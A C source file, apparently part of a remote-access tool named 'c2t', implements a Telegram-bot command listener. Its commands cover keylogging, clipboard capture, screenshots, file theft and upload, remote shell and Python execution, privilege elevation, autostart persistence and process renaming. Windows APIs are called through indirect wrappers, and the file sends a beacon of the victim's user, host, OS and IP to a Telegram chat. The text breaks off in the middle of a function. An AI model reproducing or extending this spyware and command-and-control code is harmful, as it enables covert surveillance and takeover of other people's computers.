/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "telegram_listener.h"
#include "c2t_version.h"
#include "../clipboard/clipboard_output.h"
#include "../config/config.h"
#include "../crypto/crypto.h"
#include "../files/files.h"
#include "../install/install.h"
#include "../keyboard/keyboard.h"
#include "../keyboard/keyboard_output.h"
#include "../logging/log_sender.h"
#include "../logging/logging.h"
#include "../runtime/runtime.h"
#include "../screenshot/screenshot.h"
#include "../screenshot/screenshot_output.h"
#include "../shell/shell_output.h"
#include "../shell/shell_live.h"
#include "telegram.h"
#include "telegram_platform.h"

#include <ctype.h>
#include <errno.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef _WIN32
#include <arpa/inet.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <netdb.h>
#include <pthread.h>
#include <pwd.h>
#include <sys/utsname.h>
#include <unistd.h>
#else
#include "../win32/win32_api.h"

static HANDLE c2t_CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes,
                               SIZE_T dwStackSize,
                               LPTHREAD_START_ROUTINE lpStartAddress,
                               LPVOID lpParameter, DWORD dwCreationFlags,
                               LPDWORD lpThreadId) {
  c2t_win32_api_init();
  if (g_c2t_win32.CreateThread)
    return g_c2t_win32.CreateThread(lpThreadAttributes, dwStackSize,
                                    lpStartAddress, lpParameter,
                                    dwCreationFlags, lpThreadId);
  return NULL;
}
static DWORD c2t_WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
  c2t_win32_api_init();
  if (g_c2t_win32.WaitForSingleObject)
    return g_c2t_win32.WaitForSingleObject(hHandle, dwMilliseconds);
  return WAIT_FAILED;
}
static BOOL c2t_CloseHandle(HANDLE hObject) {
  c2t_win32_api_init();
  if (g_c2t_win32.CloseHandle)
    return g_c2t_win32.CloseHandle(hObject);
  return FALSE;
}
static VOID c2t_Sleep(DWORD dwMilliseconds) {
  c2t_win32_api_init();
  if (g_c2t_win32.Sleep)
    g_c2t_win32.Sleep(dwMilliseconds);
}
static DWORD c2t_GetCurrentProcessId(VOID) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetCurrentProcessId)
    return g_c2t_win32.GetCurrentProcessId();
  return 0;
}
static BOOL c2t_GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetComputerNameA)
    return g_c2t_win32.GetComputerNameA(lpBuffer, nSize);
  return FALSE;
}
static VOID c2t_GetNativeSystemInfo(LPSYSTEM_INFO lpSystemInfo) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetNativeSystemInfo)
    g_c2t_win32.GetNativeSystemInfo(lpSystemInfo);
}
static LONG c2t_RtlGetVersion(POSVERSIONINFOEXW lpVersionInformation) {
  c2t_win32_api_init();
  if (g_c2t_win32.RtlGetVersion)
    return g_c2t_win32.RtlGetVersion(lpVersionInformation);
  return -1;
}
static ULONG c2t_GetAdaptersAddresses(ULONG Family, ULONG Flags, PVOID Reserved,
                                      PIP_ADAPTER_ADDRESSES AdapterAddresses,
                                      PULONG SizePointer) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetAdaptersAddresses)
    return g_c2t_win32.GetAdaptersAddresses(Family, Flags, Reserved,
                                            AdapterAddresses, SizePointer);
  return (ULONG)ERROR_NOT_SUPPORTED;
}
static int c2t_WideCharToMultiByte(UINT CodePage, DWORD dwFlags,
                                   LPCWCH lpWideCharStr, int cchWideChar,
                                   LPSTR lpMultiByteStr, int cbMultiByte,
                                   LPCCH lpDefaultChar,
                                   LPBOOL lpUsedDefaultChar) {
  c2t_win32_api_init();
  if (g_c2t_win32.WideCharToMultiByte)
    return g_c2t_win32.WideCharToMultiByte(
        CodePage, dwFlags, lpWideCharStr, cchWideChar, lpMultiByteStr,
        cbMultiByte, lpDefaultChar, lpUsedDefaultChar);
  return 0;
}

#define CreateThread c2t_CreateThread
#define WaitForSingleObject c2t_WaitForSingleObject
#define CloseHandle c2t_CloseHandle
#define Sleep c2t_Sleep
#define GetCurrentProcessId c2t_GetCurrentProcessId
#define GetComputerNameA c2t_GetComputerNameA
#define GetNativeSystemInfo c2t_GetNativeSystemInfo
#define RtlGetVersion c2t_RtlGetVersion
#define GetAdaptersAddresses c2t_GetAdaptersAddresses
#define WideCharToMultiByte c2t_WideCharToMultiByte
#define Sleep c2t_Sleep
#endif

#define POLL_TIMEOUT_SECONDS 15

static int listener_started;
static volatile int stopping;
static int64_t listener_start_time;

#ifdef _WIN32
static HANDLE listener_thread;
#else
static pthread_t listener_thread;
#endif

#ifndef _WIN32
#include <strings.h>
#endif

static int c2t_strcasecmp(const char *left, const char *right) {
#ifdef _WIN32
  return _stricmp(left, right);
#else
  return strcasecmp(left, right);
#endif
}

typedef enum {
  CMD_UNKNOWN = 0,
  CMD_PAUSE,
  CMD_RESUME,
  CMD_TOGGLE,
  CMD_CLIPBOARD_ON,
  CMD_CLIPBOARD_OFF,
  CMD_CLIPBOARD_TOGGLE,
  CMD_CLIPBOARD_FLUSH,
  CMD_CLIPBOARD_STATUS,
  CMD_CLIPBOARD_HELP,
  CMD_KEYBOARD_DEVICES,
  CMD_KEYBOARD_SELECT,
  CMD_KEYBOARD_ON,
  CMD_KEYBOARD_OFF,
  CMD_KEYBOARD_TOGGLE,
  CMD_KEYBOARD_MODE,
  CMD_KEYBOARD_FLUSH,
  CMD_KEYBOARD_STATUS,
  CMD_KEYBOARD_LAYOUT,
  CMD_KEYBOARD_SHORTCUTS,
  CMD_KEYBOARD_HELP,
  CMD_GETFILE,
  CMD_LS,
  CMD_FILE_EXPLORER,
  CMD_CAT,
  CMD_FILEINFO,
  CMD_UPLOAD,
  CMD_LOGS,
  CMD_SCREENSHOT,
  CMD_SCREENSHOT_DISPLAYS,
  CMD_SCREENSHOT_SELECT,
  CMD_SCREENSHOT_TIMER,
  CMD_SCREENSHOT_ON,
  CMD_SCREENSHOT_OFF,
  CMD_SCREENSHOT_TOGGLE,
  CMD_SCREENSHOT_FORMAT,
  CMD_SCREENSHOT_QUALITY,
  CMD_SCREENSHOT_STATUS,
  CMD_SCREENSHOT_HELP,
  CMD_PROCESS_NAME,
  CMD_RESTART,
  CMD_RESTART_KEYBOARD,
  CMD_RESTART_CLIPBOARD,
  CMD_RESTART_SCREENSHOT,
  CMD_RESTART_LOGS,
  CMD_RESTART_SHELL,
  CMD_RESTART_ALL,
  CMD_INSTALL,
  CMD_UNINSTALL,
  CMD_AUTOSTART,
  CMD_STATUS,
  CMD_INFO,
  CMD_KILL,
  CMD_SHELL,
  CMD_POWERSHELL,
  CMD_BASH,
  CMD_CMD,
  CMD_PYTHON,
  CMD_STDIN,
  CMD_SESSION,
  CMD_SESSION_START,
  CMD_SESSION_IN,
  CMD_SESSION_STOP,
  CMD_SESSION_STATUS,
  CMD_RUNFILE,
  CMD_SHELL_HELP,
  CMD_SHELL_LIVE,
  CMD_ELEVATE,
  CMD_HELP
} c2t_cmd_id_t;

#define CMD_TABLE_SIZE 512U
#define CMD_TABLE_MASK (CMD_TABLE_SIZE - 1U)

typedef struct {
  const char *name;
  c2t_cmd_id_t id;
} cmd_entry_t;

static const cmd_entry_t g_cmd_mappings[] = {
  {"pause", CMD_PAUSE}, {"mute", CMD_PAUSE}, {"stop_listen", CMD_PAUSE}, {"disable", CMD_PAUSE},
  {"resume", CMD_RESUME}, {"unmute", CMD_RESUME}, {"start_listen", CMD_RESUME}, {"enable", CMD_RESUME},
  {"toggle", CMD_TOGGLE},
  {"clipboard_on", CMD_CLIPBOARD_ON}, {"clipboard_enable", CMD_CLIPBOARD_ON}, {"clipboard_resume", CMD_CLIPBOARD_ON}, {"clipboard_start", CMD_CLIPBOARD_ON}, {"unmute_clipboard", CMD_CLIPBOARD_ON}, {"resume_clipboard", CMD_CLIPBOARD_ON},
  {"clipboard_off", CMD_CLIPBOARD_OFF}, {"clipboard_disable", CMD_CLIPBOARD_OFF}, {"clipboard_pause", CMD_CLIPBOARD_OFF}, {"clipboard_stop", CMD_CLIPBOARD_OFF}, {"mute_clipboard", CMD_CLIPBOARD_OFF}, {"pause_clipboard", CMD_CLIPBOARD_OFF},
  {"clipboard_toggle", CMD_CLIPBOARD_TOGGLE},
  {"clipboard_flush", CMD_CLIPBOARD_FLUSH},
  {"clipboard_status", CMD_CLIPBOARD_STATUS}, {"clipboard", CMD_CLIPBOARD_STATUS},
  {"clipboard_help", CMD_CLIPBOARD_HELP},
  {"keyboard_devices", CMD_KEYBOARD_DEVICES}, {"keyboard_list", CMD_KEYBOARD_DEVICES}, {"keyboards", CMD_KEYBOARD_DEVICES},
  {"keyboard_select", CMD_KEYBOARD_SELECT}, {"keyboard_device", CMD_KEYBOARD_SELECT}, {"keyboard_target", CMD_KEYBOARD_SELECT},
  {"keyboard_on", CMD_KEYBOARD_ON}, {"keyboard_enable", CMD_KEYBOARD_ON}, {"keyboard_resume", CMD_KEYBOARD_ON}, {"keyboard_start", CMD_KEYBOARD_ON}, {"unmute_keyboard", CMD_KEYBOARD_ON}, {"resume_keyboard", CMD_KEYBOARD_ON},
  {"keyboard_off", CMD_KEYBOARD_OFF}, {"keyboard_disable", CMD_KEYBOARD_OFF}, {"keyboard_pause", CMD_KEYBOARD_OFF}, {"keyboard_stop", CMD_KEYBOARD_OFF}, {"mute_keyboard", CMD_KEYBOARD_OFF}, {"pause_keyboard", CMD_KEYBOARD_OFF},
  {"keyboard_toggle", CMD_KEYBOARD_TOGGLE},
  {"keyboard_mode", CMD_KEYBOARD_MODE},
  {"keyboard_flush", CMD_KEYBOARD_FLUSH},
  {"keyboard_status", CMD_KEYBOARD_STATUS}, {"keyboard", CMD_KEYBOARD_STATUS},
  {"keyboard_layout", CMD_KEYBOARD_LAYOUT}, {"keyboard_layouts", CMD_KEYBOARD_LAYOUT}, {"layout", CMD_KEYBOARD_LAYOUT}, {"layouts", CMD_KEYBOARD_LAYOUT},
  {"keyboard_shortcuts", CMD_KEYBOARD_SHORTCUTS}, {"keyboard_shortcut", CMD_KEYBOARD_SHORTCUTS}, {"shortcuts", CMD_KEYBOARD_SHORTCUTS}, {"shortcut", CMD_KEYBOARD_SHORTCUTS},
  {"keyboard_help", CMD_KEYBOARD_HELP},
  {"getfile", CMD_GETFILE}, {"file", CMD_GETFILE}, {"download", CMD_GETFILE}, {"fetch", CMD_GETFILE}, {"get", CMD_GETFILE},
  {"ls", CMD_LS}, {"dir", CMD_LS}, {"list", CMD_LS},
  {"files", CMD_FILE_EXPLORER}, {"file_explorer", CMD_FILE_EXPLORER}, {"explorer", CMD_FILE_EXPLORER}, {"fm", CMD_FILE_EXPLORER}, {"browse", CMD_FILE_EXPLORER},
  {"cat", CMD_CAT}, {"view", CMD_CAT}, {"read", CMD_CAT}, {"preview", CMD_CAT},
  {"fileinfo", CMD_FILEINFO}, {"file_info", CMD_FILEINFO}, {"stat", CMD_FILEINFO},
  {"upload", CMD_UPLOAD}, {"put", CMD_UPLOAD}, {"sendfile", CMD_UPLOAD}, {"upfile", CMD_UPLOAD},
  {"logs", CMD_LOGS}, {"log", CMD_LOGS},
  {"screenshot", CMD_SCREENSHOT}, {"screen", CMD_SCREENSHOT}, {"shot", CMD_SCREENSHOT}, {"capture", CMD_SCREENSHOT},
  {"screenshot_displays", CMD_SCREENSHOT_DISPLAYS}, {"screens", CMD_SCREENSHOT_DISPLAYS}, {"monitors", CMD_SCREENSHOT_DISPLAYS}, {"displays", CMD_SCREENSHOT_DISPLAYS},
  {"screenshot_select", CMD_SCREENSHOT_SELECT}, {"screen_select", CMD_SCREENSHOT_SELECT}, {"display_select", CMD_SCREENSHOT_SELECT},
  {"screenshot_timer", CMD_SCREENSHOT_TIMER}, {"screenshot_interval", CMD_SCREENSHOT_TIMER},
  {"screenshot_on", CMD_SCREENSHOT_ON}, {"screenshot_enable", CMD_SCREENSHOT_ON}, {"screenshot_resume", CMD_SCREENSHOT_ON}, {"screenshot_start", CMD_SCREENSHOT_ON},
  {"screenshot_off", CMD_SCREENSHOT_OFF}, {"screenshot_disable", CMD_SCREENSHOT_OFF}, {"screenshot_pause", CMD_SCREENSHOT_OFF}, {"screenshot_stop", CMD_SCREENSHOT_OFF}, {"mute_screenshot", CMD_SCREENSHOT_OFF},
  {"screenshot_toggle", CMD_SCREENSHOT_TOGGLE},
  {"screenshot_format", CMD_SCREENSHOT_FORMAT}, {"screenshot_fmt", CMD_SCREENSHOT_FORMAT}, {"shot_format", CMD_SCREENSHOT_FORMAT}, {"shot_fmt", CMD_SCREENSHOT_FORMAT},
  {"screenshot_quality", CMD_SCREENSHOT_QUALITY}, {"screenshot_qual", CMD_SCREENSHOT_QUALITY}, {"shot_quality", CMD_SCREENSHOT_QUALITY}, {"shot_qual", CMD_SCREENSHOT_QUALITY},
  {"screenshot_status", CMD_SCREENSHOT_STATUS},
  {"screenshot_help", CMD_SCREENSHOT_HELP},
  {"process_name", CMD_PROCESS_NAME}, {"procname", CMD_PROCESS_NAME}, {"rename", CMD_PROCESS_NAME}, {"process", CMD_PROCESS_NAME}, {"setname", CMD_PROCESS_NAME}, {"proc_name", CMD_PROCESS_NAME}, {"process_rename", CMD_PROCESS_NAME},
  {"restart", CMD_RESTART}, {"reset", CMD_RESTART}, {"reboot", CMD_RESTART}, {"reload", CMD_RESTART}, {"restart_daemon", CMD_RESTART}, {"restart_service", CMD_RESTART}, {"reset_daemon", CMD_RESTART},
  {"restart_keyboard", CMD_RESTART_KEYBOARD}, {"restart_kb", CMD_RESTART_KEYBOARD}, {"reset_keyboard", CMD_RESTART_KEYBOARD}, {"reset_kb", CMD_RESTART_KEYBOARD},
  {"restart_clipboard", CMD_RESTART_CLIPBOARD}, {"restart_clip", CMD_RESTART_CLIPBOARD}, {"reset_clipboard", CMD_RESTART_CLIPBOARD}, {"reset_clip", CMD_RESTART_CLIPBOARD},
  {"restart_screenshot", CMD_RESTART_SCREENSHOT}, {"restart_screen", CMD_RESTART_SCREENSHOT}, {"restart_shot", CMD_RESTART_SCREENSHOT}, {"reset_screenshot", CMD_RESTART_SCREENSHOT}, {"reset_screen", CMD_RESTART_SCREENSHOT}, {"reset_shot", CMD_RESTART_SCREENSHOT},
  {"restart_logs", CMD_RESTART_LOGS}, {"restart_log", CMD_RESTART_LOGS}, {"reset_logs", CMD_RESTART_LOGS}, {"reset_log", CMD_RESTART_LOGS},
  {"restart_shell", CMD_RESTART_SHELL}, {"restart_sh", CMD_RESTART_SHELL}, {"reset_shell", CMD_RESTART_SHELL}, {"reset_sh", CMD_RESTART_SHELL},
  {"restart_all", CMD_RESTART_ALL}, {"reset_all", CMD_RESTART_ALL},
  {"install", CMD_INSTALL}, {"autorun", CMD_INSTALL}, {"startup", CMD_INSTALL}, {"install_autostart", CMD_INSTALL}, {"install_service", CMD_INSTALL},
  {"uninstall", CMD_UNINSTALL}, {"uninstall_autostart", CMD_UNINSTALL}, {"remove_autostart", CMD_UNINSTALL}, {"disable_autostart", CMD_UNINSTALL},
  {"autostart", CMD_AUTOSTART}, {"autostart_status", CMD_AUTOSTART}, {"install_status", CMD_AUTOSTART},
  {"status", CMD_STATUS}, {"ping", CMD_STATUS},
  {"info", CMD_INFO}, {"sysinfo", CMD_INFO}, {"about", CMD_INFO}, {"start", CMD_INFO},
  {"kill", CMD_KILL}, {"stop", CMD_KILL}, {"shutdown", CMD_KILL}, {"terminate", CMD_KILL}, {"quit", CMD_KILL}, {"exit", CMD_KILL},
  {"sh", CMD_SHELL}, {"shell", CMD_SHELL}, {"terminal", CMD_SHELL}, {"exec", CMD_SHELL}, {"run_cmd", CMD_SHELL}, {"run", CMD_SHELL},
  {"powershell", CMD_POWERSHELL}, {"ps", CMD_POWERSHELL}, {"pwsh", CMD_POWERSHELL},
  {"bash", CMD_BASH},
  {"cmd", CMD_CMD},
  {"py", CMD_PYTHON}, {"python", CMD_PYTHON}, {"python3", CMD_PYTHON},
  {"stdin", CMD_STDIN},
  {"session", CMD_SESSION}, {"sh_session", CMD_SESSION}, {"shell_session", CMD_SESSION},
  {"sh_start", CMD_SESSION_START}, {"session_start", CMD_SESSION_START}, {"shell_start", CMD_SESSION_START},
  {"sh_in", CMD_SESSION_IN}, {"session_in", CMD_SESSION_IN}, {"session_input", CMD_SESSION_IN}, {"shell_in", CMD_SESSION_IN}, {"input", CMD_SESSION_IN},
  {"sh_stop", CMD_SESSION_STOP}, {"session_stop", CMD_SESSION_STOP}, {"shell_stop", CMD_SESSION_STOP},
  {"sh_status", CMD_SESSION_STATUS}, {"session_status", CMD_SESSION_STATUS}, {"shell_status", CMD_SESSION_STATUS},
  {"runfile", CMD_RUNFILE}, {"execfile", CMD_RUNFILE}, {"runscript", CMD_RUNFILE}, {"exec_file", CMD_RUNFILE}, {"run_file", CMD_RUNFILE}, {"script", CMD_RUNFILE},
  {"shell_help", CMD_SHELL_HELP}, {"sh_help", CMD_SHELL_HELP}, {"shhelp", CMD_SHELL_HELP}, {"shellhelp", CMD_SHELL_HELP},
  {"shell_live", CMD_SHELL_LIVE}, {"sh_live", CMD_SHELL_LIVE}, {"live_shell", CMD_SHELL_LIVE}, {"live", CMD_SHELL_LIVE}, {"interactive", CMD_SHELL_LIVE}, {"terminal_live", CMD_SHELL_LIVE}, {"term", CMD_SHELL_LIVE}, {"pty", CMD_SHELL_LIVE},
  {"elevate", CMD_ELEVATE}, {"admin", CMD_ELEVATE}, {"sudo", CMD_ELEVATE}, {"uac", CMD_ELEVATE}, {"getadmin", CMD_ELEVATE}, {"privilege", CMD_ELEVATE}, {"privileges", CMD_ELEVATE}, {"root", CMD_ELEVATE},
  {"help", CMD_HELP}
};

static cmd_entry_t s_cmd_table[CMD_TABLE_SIZE];
static int s_cmd_table_ready = 0;

static inline uint32_t hash_cmd_str(const char *str) {
  uint32_t h = 2166136261U;
  while (*str) {
    h ^= (uint8_t)*str++;
    h *= 16777619U;
  }
  return h;
}

static void init_cmd_table(void) {
  if (s_cmd_table_ready) return;
  memset(s_cmd_table, 0, sizeof(s_cmd_table));
  size_t count = sizeof(g_cmd_mappings) / sizeof(g_cmd_mappings[0]);
  for (size_t i = 0; i < count; i++) {
    uint32_t h = hash_cmd_str(g_cmd_mappings[i].name);
    size_t idx = h & CMD_TABLE_MASK;
    while (s_cmd_table[idx].name != NULL) {
      idx = (idx + 1) & CMD_TABLE_MASK;
    }
    s_cmd_table[idx] = g_cmd_mappings[i];
  }
  s_cmd_table_ready = 1;
}

[[nodiscard]] static c2t_cmd_id_t lookup_command_id(const char *text) {
  if (!text) return CMD_UNKNOWN;
  if (!s_cmd_table_ready) init_cmd_table();

  while (isspace((unsigned char)*text)) text++;
  if (*text != '/') return CMD_UNKNOWN;
  text++;
  if (!*text) return CMD_UNKNOWN;

  char verb[64];
  size_t len = 0;
  while (*text && !isspace((unsigned char)*text) && *text != '@' && len + 1 < sizeof(verb)) {
    char c = *text++;
    if (c == '-') c = '_';
    verb[len++] = (char)tolower((unsigned char)c);
  }
  verb[len] = '\0';
  if (len == 0) return CMD_UNKNOWN;

  uint32_t h = hash_cmd_str(verb);
  size_t idx = h & CMD_TABLE_MASK;
  for (size_t probe = 0; probe < CMD_TABLE_SIZE; probe++) {
    size_t cur = (idx + probe) & CMD_TABLE_MASK;
    if (!s_cmd_table[cur].name) break;
    if (strcmp(s_cmd_table[cur].name, verb) == 0) {
      return s_cmd_table[cur].id;
    }
  }
  return CMD_UNKNOWN;
}

[[nodiscard]] static int match_command(const char *text, const char *cmd) {
  if (!text || !cmd)
    return 0;
  while (isspace((unsigned char)*text))
    text++;
  if (*text == '/')
    text++;
  if (*cmd == '/')
    cmd++;

  while (*cmd) {
    char c1 = *text;
    char c2 = *cmd;
    if (c1 == '-')
      c1 = '_';
    if (c2 == '-')
      c2 = '_';
    if (tolower((unsigned char)c1) != tolower((unsigned char)c2))
      return 0;
    text++;
    cmd++;
  }

  char next = *text;
  return (next == '\0' || next == '@' || isspace((unsigned char)next));
}

static const char *get_command_argument(const char *text) {
  if (!text)
    return "";
  while (isspace((unsigned char)*text))
    text++;
  if (*text == '/')
    text++;
  while (*text && !isspace((unsigned char)*text))
    text++;
  while (isspace((unsigned char)*text))
    text++;
  return text;
}

static void format_metric_bytes(uint64_t b, char *out, size_t cap) {
  if (!out || cap == 0)
    return;
  if (b < 1024) {
    snprintf(out, cap, "%llu B", (unsigned long long)b);
  } else if (b < 1024 * 1024) {
    snprintf(out, cap, "%.1f KB (%llu B)", (double)b / 1024.0,
             (unsigned long long)b);
  } else if (b < 1024ULL * 1024 * 1024) {
    snprintf(out, cap, "%.2f MB (%llu bytes)", (double)b / (1024.0 * 1024.0),
             (unsigned long long)b);
  } else {
    snprintf(out, cap, "%.2f GB (%llu bytes)",
             (double)b / (1024.0 * 1024.0 * 1024.0), (unsigned long long)b);
  }
}

static void escape_html_str(const char *src, char *dst, size_t dst_size) {
  if (!src || !dst || dst_size == 0) {
    if (dst && dst_size > 0)
      dst[0] = '\0';
    return;
  }
  size_t d = 0;
  for (size_t s = 0; src[s] != '\0' && d + 6 < dst_size; ++s) {
    if (src[s] == '&') {
      memcpy(dst + d, "&amp;", 5);
      d += 5;
    } else if (src[s] == '<') {
      memcpy(dst + d, "&lt;", 4);
      d += 4;
    } else if (src[s] == '>') {
      memcpy(dst + d, "&gt;", 4);
      d += 4;
    } else if (src[s] == '"') {
      memcpy(dst + d, "&quot;", 6);
      d += 6;
    } else {
      dst[d++] = src[s];
    }
  }
  dst[d] = '\0';
}

static void get_system_user_and_host(char *user_out, size_t user_cap,
                                     char *host_out, size_t host_cap) {
  if (user_out && user_cap > 0)
    snprintf(user_out, user_cap, "unknown");
  if (host_out && host_cap > 0)
    snprintf(host_out, host_cap, "localhost");

#ifndef _WIN32
  const char *u = getenv("USER");
  if (!u || !*u)
    u = getenv("LOGNAME");
  if (!u || !*u) {
    struct passwd *pw = getpwuid(geteuid());
    if (pw && pw->pw_name)
      u = pw->pw_name;
  }
  if (u && *u && user_out && user_cap > 0) {
    snprintf(user_out, user_cap, "%s", u);
  }

  char h[256] = "";
  if (gethostname(h, sizeof(h)) == 0 && h[0] != '\0') {
    if (host_out && host_cap > 0)
      snprintf(host_out, host_cap, "%s", h);
  } else {
    const char *env_h = getenv("HOSTNAME");
    if (env_h && *env_h && host_out && host_cap > 0) {
      snprintf(host_out, host_cap, "%s", env_h);
    }
  }
#else
  const char *env_u = getenv("USERNAME");
  if (!env_u || !*env_u)
    env_u = getenv("USER");
  if (env_u && *env_u && user_out && user_cap > 0) {
    snprintf(user_out, user_cap, "%s", env_u);
  }

  char h[256] = "";
  DWORD h_len = sizeof(h);
  if (GetComputerNameA(h, &h_len) && h[0] != '\0') {
    if (host_out && host_cap > 0)
      snprintf(host_out, host_cap, "%s", h);
  } else {
    const char *env_h = getenv("COMPUTERNAME");
    if (env_h && *env_h && host_out && host_cap > 0) {
      snprintf(host_out, host_cap, "%s", env_h);
    }
  }
#endif
}

static void get_system_os_info(char *os_out, size_t os_cap) {
  if (!os_out || os_cap == 0)
    return;
  snprintf(os_out, os_cap, "Unknown OS");

#ifndef _WIN32
  struct utsname uts;
  if (uname(&uts) == 0) {
#if defined(__APPLE__)
    snprintf(os_out, os_cap, "macOS (%s %s)", uts.release, uts.machine);
#elif defined(__linux__)
    char distro[128] = "";
    FILE *f = fopen("/etc/os-release", "r");
    if (f) {
      char line[256];
      while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "PRETTY_NAME=", 12) == 0) {
          char *val = line + 12;
          if (*val == '"' || *val == '\'') {
            val++;
            char *end = strchr(val, '"');
            if (!end)
              end = strchr(val, '\'');
            if (end)
              *end = '\0';
          } else {
            char *end = strpbrk(val, "\r\n");
            if (end)
              *end = '\0';
          }
          snprintf(distro, sizeof(distro), "%s", val);
          break;
        }
      }
      fclose(f);
    }
    if (distro[0] != '\0') {
      snprintf(os_out, os_cap, "%s (%s %s)", distro, uts.release,
               uts.machine);
    } else {
      snprintf(os_out, os_cap, "%s %s (%s)", uts.sysname, uts.release,
               uts.machine);
    }
#else
    snprintf(os_out, os_cap, "%s %s (%s)", uts.sysname, uts.release,
             uts.machine);
#endif
  }
#else
  OSVERSIONINFOEXW osvi;
  memset(&osvi, 0, sizeof(osvi));
  osvi.dwOSVersionInfoSize = sizeof(osvi);

  SYSTEM_INFO si;
  memset(&si, 0, sizeof(si));
  GetNativeSystemInfo(&si);
  const char *arch = "x86";
  if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
    arch = "x64";
  else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64)
    arch = "ARM64";
  else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM)
    arch = "ARM";

  if (RtlGetVersion(&osvi) == 0) {
    const char *win_name = "Windows";
    if (osvi.dwMajorVersion == 10 && osvi.dwBuildNumber >= 22000)
      win_name = "Windows 11";
    else if (osvi.dwMajorVersion == 10)
      win_name = "Windows 10";
    else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 3)
      win_name = "Windows 8.1";
    else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 2)
      win_name = "Windows 8";
    else if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1)
      win_name = "Windows 7";

    snprintf(os_out, os_cap, "%s (Build %lu, %s)", win_name,
             (unsigned long)osvi.dwBuildNumber, arch);
    return;
  }
  snprintf(os_out, os_cap, "Windows (%s)", arch);
#endif
}

static void get_system_ip_info(char *ip_out, size_t ip_cap) {
  if (!ip_out || ip_cap == 0)
    return;
  snprintf(ip_out, ip_cap, "unknown");

#ifndef _WIN32
  struct ifaddrs *ifaddr = NULL;
  if (getifaddrs(&ifaddr) == 0) {
    for (struct ifaddrs *ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
      if (!ifa->ifa_addr || (ifa->ifa_flags & IFF_LOOPBACK) ||
          !(ifa->ifa_flags & IFF_UP))
        continue;
      if (ifa->ifa_addr->sa_family == AF_INET) {
        char host[NI_MAXHOST] = "";
        if (getnameinfo(ifa->ifa_addr, sizeof(struct sockaddr_in), host,
                        sizeof(host), NULL, 0, NI_NUMERICHOST) == 0 &&
            host[0] != '\0') {
          snprintf(ip_out, ip_cap, "%s (%s)", host, ifa->ifa_name);
          break;
        }
      }
    }
    freeifaddrs(ifaddr);
  }
#else
  ULONG flags = GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST |
                GAA_FLAG_SKIP_DNS_SERVER;
  ULONG out_buf_len = 15360;
  PIP_ADAPTER_ADDRESSES addresses = (IP_ADAPTER_ADDRESSES *)malloc(out_buf_len);
  if (addresses) {
    ULONG ret = GetAdaptersAddresses(AF_INET, flags, NULL,
                                     addresses, &out_buf_len);
    if (ret == ERROR_BUFFER_OVERFLOW) {
      free(addresses);
      addresses = (IP_ADAPTER_ADDRESSES *)malloc(out_buf_len);
      if (addresses) {
        ret = GetAdaptersAddresses(AF_INET, flags, NULL,
                                   addresses, &out_buf_len);
      }
    }
    if (ret == NO_ERROR && addresses) {
      for (PIP_ADAPTER_ADDRESSES curr = addresses; curr != NULL;
           curr = curr->Next) {
        if (curr->IfType == IF_TYPE_SOFTWARE_LOOPBACK ||
            curr->OperStatus != IfOperStatusUp)
          continue;
        if (curr->FirstUnicastAddress &&
            curr->FirstUnicastAddress->Address.lpSockaddr) {
          struct sockaddr_in *sa =
              (struct sockaddr_in *)(void *)
                  curr->FirstUnicastAddress->Address.lpSockaddr;
          const unsigned char *b = (const unsigned char *)&sa->sin_addr;
          char friendly[64] = "";
          WideCharToMultiByte(CP_UTF8, 0, curr->FriendlyName, -1, friendly,
                              sizeof(friendly), NULL, NULL);
          snprintf(ip_out, ip_cap, "%u.%u.%u.%u (%s)", b[0], b[1], b[2], b[3],
                   friendly[0] ? friendly : "Ethernet");
          break;
        }
      }
    }
    if (addresses)
      free(addresses);
  }
#endif
}

int telegram_send_start_info(void) {
  const c2t_config_t *config = c2t_config_get();
  if (!config || !config->telegram_bot_token || !config->telegram_chat_id ||
      !*config->telegram_bot_token || !*config->telegram_chat_id) {
    return 0;
  }

  char raw_user[128] = {}, raw_host[128] = {}, raw_os[256] = {},
       raw_ip[128] = {};
  get_system_user_and_host(raw_user, sizeof(raw_user), raw_host,
                           sizeof(raw_host));
  get_system_os_info(raw_os, sizeof(raw_os));
  get_system_ip_info(raw_ip, sizeof(raw_ip));

  char user[256] = {}, host[256] = {}, os_str[512] = {}, ip_str[256] = {};
  escape_html_str(raw_user, user, sizeof(user));
  escape_html_str(raw_host, host, sizeof(host));
  escape_html_str(raw_os, os_str, sizeof(os_str));
  escape_html_str(raw_ip, ip_str, sizeof(ip_str));

  const char *daemon_name =
      config->daemon_name && *config->daemon_name ? config->daemon_name : "c2t";
  char proc_name[128] = {};
  escape_html_str(daemon_name, proc_name, sizeof(proc_name));

  unsigned long pid = 0;
#ifndef _WIN32
  pid = (unsigned long)getpid();
#else
  pid = (unsigned long)GetCurrentProcessId();
#endif

  const char *role_str = "🟢 Standalone Daemon";
  if (config->is_worker) {
    role_str = "🔄 Worker (Supervisor Active)";
  } else if (config->auto_restart) {
    role_str = "🛡️ Supervisor Managed";
  }

  /* Subsystems */
  char clip_detail[128] = {};
  if (config->disable_clipboard) {
